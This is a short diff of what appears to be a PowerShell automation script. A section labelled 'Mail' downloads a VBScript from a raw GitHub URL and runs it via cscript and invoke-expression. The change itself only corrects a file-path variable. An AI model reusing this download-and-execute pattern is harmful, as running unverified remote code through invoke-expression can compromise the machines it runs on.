@@ -32,6 +32,6 @@ invoke-expression $command
 #Part 4 - Mail
 $my_path_m="D:\so.vbs"
 $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/so.vbs';
-$b.DownloadFile($url, $my_path) ;
+$b.DownloadFile($url, $my_path_m) ;
 $command = "cmd /C cscript "+$my_path_m
 invoke-expression $command
